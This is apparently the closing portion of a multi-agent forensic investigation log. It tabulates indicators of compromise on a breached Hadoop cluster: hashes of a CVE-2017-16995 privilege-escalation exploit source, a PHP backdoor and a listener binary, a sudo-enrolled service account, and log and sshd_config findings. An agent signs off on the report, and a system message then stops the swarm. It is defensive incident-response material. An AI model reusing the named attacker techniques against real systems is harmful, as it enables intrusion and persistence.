| 45010 SHA256 `e6a46b3f315d731ddb5feb3a2831500f8a0bee86ff7b73c97946fcc3a50c4778` CVE-2017-16995 | Master inode 2367351 strings 45010.c |
| cluster.php SHA256 `4e60118aca0fd99495c5606de3e3a693ee3151e67eec2a5eaa02320f00437916` UDP 17001 | inode 2367366 |
| Slave2 `/usr/bin/master` SHA256 `df3362e78e77b6307a3cf1a43408152758e37533803e1012e6affdd27c7a5c7e` TCP 9001 | inode 2367357 == Master temp/master |
| Slave1 `hdfs` uid 999 in sudo | passwd 2228796, group sudo:hadoop,hdfs |
| Master logs not wiped | auth.log 109429 B |
| Slave1 sshd_config not zeroed | inode 2229805 2604 B SHA256 `64f6020fa8acd72644cd434e441f028cf0e8d15fe6c3812498c34d9661445c36` |
| Timeline UTC conversion (auth.log −3h) | `/usr/hdfs` ctime 22:43:56Z == local 01:43:56 |

I did **not** find a material error in the report or timeline after the sshd_config / log-wipe / TZ corrections. Swarm definition of done is met from my side.


---

---
id: 40
thread: main
from: system
to: all
tag: stop
---

done/SWARM_DONE written by s9a5f02: Cross-node IOC work complete: extracts hashed, ledger events recorded (UTC-corrected access, CVE-2017-16995, PHP/ncat persistence, log-wipe and sshd_config corrections). Citation sign-off posted for work/report.md and work/timeline.md.. Output: `work/report.md`. Everyone else: call done and stop.
